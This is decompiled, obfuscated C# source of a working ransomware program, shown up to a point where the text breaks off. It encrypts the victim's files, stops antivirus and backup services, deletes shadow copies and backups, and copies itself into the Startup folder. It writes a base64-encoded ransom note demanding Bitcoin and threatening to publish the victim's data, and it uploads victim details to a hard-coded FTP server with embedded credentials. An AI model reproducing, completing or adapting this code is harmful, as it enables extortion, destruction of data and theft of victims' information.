using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace tmhhYTpfSQZiU;

internal sealed class RDcmyWZSLtSOf
{
	public sealed class vtRtCUFVhoPX
	{
		private static StringCollection kRwKxcMtMwJ = new StringCollection();

		private static List<string> bmxIqdjcAY = new List<string>();

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, "*.*");
			}
			catch (UnauthorizedAccessException ex)
			{
				kRwKxcMtMwJ.Add(ex.Message);
			}
			catch (DirectoryNotFoundException)
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().EndsWith(".crypted"))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(ROMJPWDokvOAc) * 1024.0 * 1024.0 && KVXxStcGhLt == "YES")
							{
								bmxIqdjcAY.Add(text);
							}
							else if (File.Exists(text) && KVXxStcGhLt == "NO")
							{
								bmxIqdjcAY.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				array3 = array2;
				foreach (string string_ in array3)
				{
					WalkDirectoryTree(string_);
				}
			}
			return bmxIqdjcAY;
		}
	}

	private sealed class IXeelhjfnkbbI
	{
		public string[] btEpHKLIBDCkaFP;

		public string[] aHCzRdAomyQf;

		public string VrfRRwtyTgpz;

		public string gTlZNytZFDcqoAEhw;
	}

	private sealed class TWuVUTtEqAEB
	{
		public IXeelhjfnkbbI FZjnGhZqQCLYbX;

		public string OfhPCNgNxTvj;

		public void _003CCrypt_003Eb__6()
		{
			JGyJbgcyeoQw(OfhPCNgNxTvj, FZjnGhZqQCLYbX.btEpHKLIBDCkaFP, FZjnGhZqQCLYbX.gTlZNytZFDcqoAEhw, FZjnGhZqQCLYbX.aHCzRdAomyQf, FZjnGhZqQCLYbX.VrfRRwtyTgpz);
		}
	}

	public static string MpbxXRrATkRXYSx = "EVET";

	public static byte[] DbMghamfwARw = null;

	public static string KVXxStcGhLt = "YES";

	public static string ROMJPWDokvOAc = "100";

	public static List<string> tpUqhpGZfg = new List<string>();

	public static List<string> iQIBwKOixfAx = new List<string>();

	public static string IHbuDqnUDWb = "NO";

	public static string SLwAAjoiUVG = "";

	public static string VINZxHTyAPk = "NO";

	public static int bYCWcurOOWbtMY = 0;

	public static string ymCDCajmIS = "NO";

	public static string wHEKAqkFoazZe = "NO";

	public static string TkXRlWyjTTtKZug = "NO";

	public static string pyBXtsBGqEioL = "0";

	public static string YrJsNIKrslK = "NO";

	public static string yShdxWDiUgtPT = "NO";

	public static string VQqVDnIGPcb = "NO";

	public static string SElaADphGtk = "NO";

	public static List<string> IhqpQTssarAvl = new List<string>
	{
		qlgUvNJCRuJkG("bHNhc3MuZXhl"),
		qlgUvNJCRuJkG("c3ZjaHN0LmV4ZQ=="),
		qlgUvNJCRuJkG("Y3Jjc3MuZXhl"),
		qlgUvNJCRuJkG("Y2hyb21lMzIuZXhl"),
		qlgUvNJCRuJkG("ZmlyZWZveC5leGU="),
		qlgUvNJCRuJkG("Y2FsYy5leGU="),
		qlgUvNJCRuJkG("bXlzcWxkLmV4ZQ=="),
		qlgUvNJCRuJkG("ZGxsaHN0LmV4ZQ=="),
		qlgUvNJCRuJkG("b3BlcmEzMi5leGU="),
		qlgUvNJCRuJkG("bWVtb3AuZXhl"),
		qlgUvNJCRuJkG("c3Bvb2xjdi5leGU="),
		qlgUvNJCRuJkG("Y3RmbW9tLmV4ZQ=="),
		qlgUvNJCRuJkG("U2t5cGVBcHAuZXhl")
	};

	public static List<string> UzylaUYbbu = new List<string>();

	public static string RZgyIFYfpaE = "NO";

	public static string RbdMsDfHpizR = "NO";

	public static string pgCQSRorPlQ = "NO";

	public static List<string> zwciFfYZrmaq = new List<string>();

	public static string rPsbbmTuTxHBs = "YES";

	private static string wvIdWxhXJcuBvyTL = "3747bdbf-0ef0-42d8-9234-70d68801f407";

	public static string QAFZFuftjcGOKwIR = "YES";

	public static string YxiEoFxQPJg = "NO";

	public static List<string> GoJPwChStfuAWCno = new List<string>
	{
		qlgUvNJCRuJkG("c3RvcCBhdnBzdXMgL3k="),
		qlgUvNJCRuJkG("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		qlgUvNJCRuJkG("c3RvcCBtZmV3YyAveQ=="),
		qlgUvNJCRuJkG("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		qlgUvNJCRuJkG("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		qlgUvNJCRuJkG("c3RvcCBEZWZXYXRjaCAveQ=="),
		qlgUvNJCRuJkG("c3RvcCBjY0V2dE1nciAveQ=="),
		qlgUvNJCRuJkG("c3RvcCBjY1NldE1nciAveQ=="),
		qlgUvNJCRuJkG("c3RvcCBTYXZSb2FtIC95"),
		qlgUvNJCRuJkG("c3RvcCBSVFZzY2FuIC95"),
		qlgUvNJCRuJkG("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		qlgUvNJCRuJkG("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		qlgUvNJCRuJkG("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		qlgUvNJCRuJkG("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		qlgUvNJCRuJkG("c3RvcCBZb29CYWNrdXAgL3k="),
		qlgUvNJCRuJkG("c3RvcCBZb29JVCAveQ=="),
		qlgUvNJCRuJkG("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		qlgUvNJCRuJkG("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		qlgUvNJCRuJkG("c3RvcCBWU05BUFZTUyAveQ=="),
		qlgUvNJCRuJkG("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		qlgUvNJCRuJkG("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		qlgUvNJCRuJkG("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		qlgUvNJCRuJkG("c3RvcCB2ZWVhbSAveQ=="),
		qlgUvNJCRuJkG("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		qlgUvNJCRuJkG("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		qlgUvNJCRuJkG("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		qlgUvNJCRuJkG("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		qlgUvNJCRuJkG("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		qlgUvNJCRuJkG("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		qlgUvNJCRuJkG("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		qlgUvNJCRuJkG("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		qlgUvNJCRuJkG("c3RvcCBBY3JTY2gyU3ZjIC95"),
		qlgUvNJCRuJkG("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		qlgUvNJCRuJkG("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		qlgUvNJCRuJkG("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		qlgUvNJCRuJkG("c3RvcCBzb3Bob3MgL3k=")
	};

	public static List<string> HMMYlhQjtR = new List<string>
	{
		qlgUvNJCRuJkG("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		qlgUvNJCRuJkG("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		qlgUvNJCRuJkG("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		qlgUvNJCRuJkG("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> ZmEwEzstaiopN = new List<string>
	{
		qlgUvNJCRuJkG("L0lNIG1zcHViLmV4ZSAvRg=="),
		qlgUvNJCRuJkG("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		qlgUvNJCRuJkG("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G")
	};

	public static List<string> TxTCFfvDvRAdUx = new List<string>
	{
		qlgUvNJCRuJkG("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="),
		qlgUvNJCRuJkG("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		qlgUvNJCRuJkG("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		qlgUvNJCRuJkG("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		qlgUvNJCRuJkG("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		qlgUvNJCRuJkG("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		qlgUvNJCRuJkG("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		qlgUvNJCRuJkG("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		qlgUvNJCRuJkG("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		qlgUvNJCRuJkG("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		qlgUvNJCRuJkG("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		qlgUvNJCRuJkG("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		qlgUvNJCRuJkG("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		qlgUvNJCRuJkG("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=")
	};

	public static List<string> PDMDgVYdOrBbAlQ = new List<string>
	{
		qlgUvNJCRuJkG("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		qlgUvNJCRuJkG("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		qlgUvNJCRuJkG("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		qlgUvNJCRuJkG("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		qlgUvNJCRuJkG("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		qlgUvNJCRuJkG("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static string TJxCiOoMXBAN = "NO";

	public static string OKrIYGfvgvUGQFv = "NO";

	internal static DateTime RopeqdgjiacL = new DateTime(2000, 1, 1);

	internal static DateTime EZsntuuPKfDm = new DateTime(2100, 1, 1);

	public static string YsLHlBbCxME = "NO";

	public static string QRYUIHruadYeI = "10";

	public static string lmgDKCBYmoQML = "NO";

	public static string PingDPwWVuw = "NO";

	public static string RnujijBuBbiu = "NO";

	public static string NeDdjvDpnRgYL = "NO";

	public static string RhYMupBltvmcgc = "NO";

	public static string lIzEKIwoiIVuN = "YES";

	public static List<string> DnBSwKcULbdx = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string FnyYzxGMgFqyf = "YES";

	public static string QesrnChlqX = "1";

	public static string nBUBpTTWjqWeatp = "NO";

	public static string zREzEUyyiAezB = "NO";

	public static string CSzeUedRTsw = "NO";

	public static string BneKtmvJsuA = string.Empty;

	public static string nmGDRcnPAMWQ = "NO";

	public static string FMXeMOyzhU = "NO";

	public static string lWcSjdDqfsCC = "NO";

	public static string YUsZUhKVFhsqT = "";

	public static string cyvUCnZdUgpr = "";

	public static string UsDrRmWVOsTrf = "NO";

	public static string hrRrVRLXXT = "NO";

	public static string lQKsWMYRkRw = "NO";

	public static string tzPoOGcZrUoK = "NO";

	private static void Main(string[] args)
	{
		try
		{
			SegQrtqOLb.jmqLkNnqQNUjn(wvIdWxhXJcuBvyTL);
		}
		catch (Exception)
		{
		}
		if (TkXRlWyjTTtKZug == "YES")
		{
			Thread.Sleep(int.Parse(pyBXtsBGqEioL));
		}
		if (NeDdjvDpnRgYL == "YES" && RhYMupBltvmcgc == "YES")
		{
			try
			{
				bmryBPshhEFFyoM(qlgUvNJCRuJkG("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		if (VQqVDnIGPcb == "YES" && !kJonFWMnLmo.YIHfjIOLEUmn())
		{
			kJonFWMnLmo.oHBUGntyCoVr();
		}
		if (RbdMsDfHpizR == "YES" && kJonFWMnLmo.YIHfjIOLEUmn())
		{
			new HkvfqrDSDcRz().CHsYdZWEhRX(bool_0: false);
			new HkvfqrDSDcRz().EiJaFciylcLkvUPi();
		}
		if (wHEKAqkFoazZe == "YES")
		{
			UkfAFyEcpnxl.WwMrNlAfpNf();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text2 = text + Path.GetFileName(fileName);
		if (VINZxHTyAPk == "YES" && fileName != text2)
		{
			Thread thread = new Thread(QOOKCtPZlycYou);
			thread.IsBackground = true;
			thread.Priority = ThreadPriority.Highest;
			thread.Start();
		}
		if (IHbuDqnUDWb == "YES" && mainModule != null && fileName != text2)
		{
			try
			{
				bYCWcurOOWbtMY = cuWpSiPIPWd(0, IhqpQTssarAvl.Count);
				File.Copy(fileName, text + IhqpQTssarAvl[bYCWcurOOWbtMY], overwrite: true);
				Process.Start(text + IhqpQTssarAvl[bYCWcurOOWbtMY]);
				nCGKAuYuTCR();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (TJxCiOoMXBAN == "YES" && DateTime.Now < RopeqdgjiacL)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (OKrIYGfvgvUGQFv == "YES" && DateTime.Now > EZsntuuPKfDm)
			{
				nCGKAuYuTCR();
			}
		}
		catch
		{
		}
		foreach (string item in GoJPwChStfuAWCno)
		{
			xUeVsqPFysm("net.exe", item);
		}
		foreach (string item2 in HMMYlhQjtR)
		{
			xUeVsqPFysm("sc.exe", item2);
		}
		foreach (string item3 in ZmEwEzstaiopN)
		{
			xUeVsqPFysm("taskkill.exe", item3);
		}
		foreach (string item4 in TxTCFfvDvRAdUx)
		{
			xUeVsqPFysm("vssadmin.exe", item4);
		}
		foreach (string item5 in PDMDgVYdOrBbAlQ)
		{
			xUeVsqPFysm("del.exe", item5);
		}
		fNiFwRgRZTE.OStiLsXAjLpUW();
		if (lmgDKCBYmoQML == "NO")
		{
			SLwAAjoiUVG = jLqmXZFqKeDUSH.iKBhCzOWeUNPDv(32);
		}
		else
		{
			SLwAAjoiUVG = "GD1JIMDZ2B79CUKFXBGZIVZCW8RN3R6V";
		}
		string text3 = pJGeopaXzOxDALp.xQGIuBQpwzhHS(SLwAAjoiUVG);
		try
		{
			xXNoCxZJmR(new string[1] { "[auto]" }, new string[101]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf",
				"cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx",
				"mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql",
				"ora", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf",
				"7z"
			}, new string[0], SLwAAjoiUVG, ".crypted");
		}
		catch
		{
			nCGKAuYuTCR();
		}
		SLwAAjoiUVG = jLqmXZFqKeDUSH.iKBhCzOWeUNPDv(32);
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt"))
		{
			using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt");
			streamWriter.WriteLine(qlgUvNJCRuJkG("QXRlbnRpb24hIGFsbCB5b3VyIGltcG9ydGFudCBmaWxlcyB3ZXJlIGVuY3J5cHRlZCENCnRvIGdldCB5b3VyIGZpbGVzIGJhY2sgc2VuZCAyNTAgRXVybyBpbiBCaXRjb2lucyBhbmQgY29udGFjdCB1cyBvbiBFLU1haWwgd2l0aCBwcm9vZiBvZiBwYXltZW50IA0KYW5kIHlvdXIgS2V5IElkZW50aWZpZXIsIHlvdSBjYW4gZmluZCB0aGlzIGhlcmUuDQpXZSB3aWxsIHNlbmQgeW91IGEgZGVjcnlwdGlvbiB0b29sIHdpdGggeW91ciBwZXJzb25hbCBkZWNyeXB0aW9uIHBhc3N3b3JkLg0KV2hlbiB5b3Ugbm90IENvbnRhY3QgdXMgYW5kIFBheSwgd2UgZG8gbWFrZSB5b3VyIERhdGEgUHVibGljIG9uIGEgV2Vic2l0ZXMsIHdoZXJlIGV2ZXJ5b25lIHNlZXMgdGhlaXIgZW50aXJlIGNvbXB1dGVyIGNvbnRlbnQgZnJvbSB5b3UuDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KV2hlcmUgY2FuIHlvdSBidXkgQml0Y29pbnM6DQoNCmh0dHBzOi8vd3d3LmNvaW5iYXNlLmNvbQ0KaHR0cHM6Ly9sb2NhbGJpdGNvaW5zLmNvbQ0KaHR0cHM6Ly9hbnljb2luLmV1DQpodHRwczovL2JpdHBhbmRhLmNvbQ0KaHR0cHM6Ly9iaW5hbmNlLmNvbQ0KaHR0cHM6Ly9iaXRjb2luYm9uLmF0DQoNCkZvciBTd2l0emVybGFuZCBhbmQgQXVzdHJpYQ0KQml0Y29pbiBBdXRvbWF0IFbDpHJkZXggLSBTd2lzcyBDbGllbnRzDQpBbGwgU0JCIEF1dG9tYXQgIC0gU3dpc3MgQ2xpZW50cw0KQml0Y29pbiBCb24gLSBBdXN0cmlhIENsaWVudHMNCg0KWW91IGNhbiBjYWxjdWxhdGUgdGhlIEJpdGNvaW4gcmF0ZSBoZXJlOg0KaHR0cHM6Ly9wcmVldi5jb20NCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpDb250YWN0OiB0aW1lcGF5QHByb3Rvbm1haWwuY29tDQoNClBsZWFzZSBzZW5kIHVzIHRoZSBrZXkgaWRlbnRpZmljYXRpb24gY29kZSB2aWEgZW1haWwsIHdoaWNoIHlvdSBjYW4gc2VlIGF0IHRoZSBib3R0b20gb2YgdGhpcyB0ZXh0IGFzIHNvb24gYXMgdGhlIHBheW1lbnQgaGFzIGJlZW4gbWFkZSBieSB5b3UuDQoNClBsZWFzZSBzZW5kIHRoZSBCaXRjb2luIG9uIHRoaXMgQWRyZXNzIGZvciB0aGUgUGF5bWVudDoNCg0KYmMxcTVkbjN0YzY3d2g5MG1ycTY1eG04YTJ6OWxyOXQwdGMybGN0d3YzDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCkdFUk1BTiBTUEVBSyBDTElFTlRTDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCkFjaHR1bmchIEFsbGUgSWhyZSBEYXRlbiB3dXJkZW4gdmVyc2NobMO8c3NlbHQsIHdlbm4gU2llIGFsbGUgaWhyZSBEYXRlbiBhdWYgSWhyZW0gUmVjaG5lciB3aWVkZXIgd29sbGVuLCBkYW5uIEJlemFobGVuIFNpZSAyNTAgRXVybyBpbiBCaXRjb2lucw0KdW5kIEtvbnRha3RpZXJlbiBTaWUgdW5zIHZpYSBFLU1haWwgbWl0IGVpbmVyIEJlc3TDpHRpZ3VuZyBkZXIgWmFobHVuZyBhbiB1bnNlcmUgQml0Y29pbiBBZHJlc3NlLg0KV2lyIHNlbmRlbiBJaG5lbiBkYW5uIGVpbiBFbnRzY2hsw7xzc2VsdW5ncyBQcm9ncmFtbSBkYW1pdCBTaWUgYWxsZXMgd2llZGVyIEVudHNjaGzDvHNzZWxuIGvDtm5uZW4uDQpGYWxscyBTaWUgbmljaHQgaW5uZXJoYWxiIGVpbiBwYWFyIFRhZ2VuIEJlemFobGVuLHdlcmRlbiB3aXIgSWhyZSBEYXRlIGF1ZiBlaW5lciBXZWJzZWl0ZSB2ZXLDtmZmZW50bGljaGVuIGRpZSBmw7xyIGplZGVuIFp1Z8OkbmdsaWNoIGlzdC4NCk9iZXJoYWxiIGRlcyBUZXh0ZXMgc2VoZW4gU2llIHdvIFNpZSBkaWUgQml0Y29pbnMgZXJ3ZXJiZW4ga8O2bm5lbiB1bSBkaWVzZSBhbiB1bnMgenUgc2VuZGVuLg0KDQpCaXR0ZSBzZW5kZW4gU2llIHVucyB2aWEgRS1NYWlsIGRlbiBLZXkgSWRlbnRpZmlrYXRpb25zY29kZSwgZGllc2VuIHNlaGVuIFNpZSBnYW56IHVudGVuIGluIGRpZXNlbSBUZXh0IGF1ZmdlZsO8aHJ0LCBzb2JhbGQgZGllIFphaGx1bmcgZ2V0w6R0aWd0IHd1cmRlIHZvbiBJaG5lbi4NCg0KVW5zZXJlIEtvbnRha3QgRS1NYWlsIDogdGltZXBheUBwcm90b25tYWlsLmNvbQ0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KQml0dGUgc2VuZGVuIHNpZSBoaWVyaGluIGRpZSBCaXRjb2lucyBmw7xyIGRpZSBaYWhsdW5nDQoNCmJjMXE1ZG4zdGM2N3doOTBtcnE2NXhtOGEyejlscjl0MHRjMmxjdHd2Mw0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpJREVOVElGSUNBVElPTlNLRVkgIC0gSURFTlRJRktBVElPTlNDT0RFICAgLyAgU0VORCBUSElTIENPREUgVklBIEUtTUFJTA=="));
			streamWriter.WriteLine(text3);
			if (QAFZFuftjcGOKwIR == "NO")
			{
				streamWriter.WriteLine(qlgUvNJCRuJkG("TnVtYmVyIG9mIGZpbGVzIHRoYXQgeW91IGNvdWxkIGhhdmUgcG90ZW50aWFsbHkgbG9zdCBmb3JldmVyIGNhbiBiZSBhcyBoaWdoIGFzOiA=") + Convert.ToString(zwciFfYZrmaq.Count));
			}
		}
		foreach (string item6 in UzylaUYbbu)
		{
			try
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt", item6 + "\\HELP_ME_RECOVER_MY_FILES.txt", overwrite: true);
			}
			catch (Exception)
			{
			}
		}
		if (rPsbbmTuTxHBs == "YES")
		{
			try
			{
				if (QAFZFuftjcGOKwIR == "NO")
				{
					ebEAligDPpkfEi.BsmXCkNiegR("ftp://199.188.200.253/public_html/newshit/", "9b732058@noether-stiftung.de", "13MelisaLening37", qlgUvNJCRuJkG("Q2xpZW50IElQOiAg") + new WebClient().DownloadString(qlgUvNJCRuJkG("aHR0cDovL2ljYW5oYXppcC5jb20=")) + qlgUvNJCRuJkG("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + qlgUvNJCRuJkG("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog") + Convert.ToString(zwciFfYZrmaq.Count) + "\r\n" + qlgUvNJCRuJkG("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(zwciFfYZrmaq) + "\r\n" + qlgUvNJCRuJkG("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
				else
				{
					ebEAligDPpkfEi.BsmXCkNiegR("ftp://199.188.200.253/public_html/newshit/", "9b732058@noether-stiftung.de", "13MelisaLening37", qlgUvNJCRuJkG("Q2xpZW50IElQOiAg") + new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=") + qlgUvNJCRuJkG("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + qlgUvNJCRuJkG("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(zwciFfYZrmaq) + "\r\n" + qlgUvNJCRuJkG("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
			}
			catch
			{
			}
		}
		if (SElaADphGtk == "YES")
		{
			try
			{
				HwhTVFdtpiAC.ISsaVuSqWbEw(new Uri("http://www.my_wallpaper_location.com/wallpaper.bmp"));
			}
			catch
			{
			}
		}
		Process.Start(qlgUvNJCRuJkG("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt");
		if (!string.IsNullOrEmpty(BneKtmvJsuA))
		{
			try
			{
				File.Delete(BneKtmvJsuA);
			}
			catch
			{
			}
		}
		if (MpbxXRrATkRXYSx == "EVET")
		{
			nCGKAuYuTCR();
		}
	}

	public static void QOOKCtPZlycYou()
	{
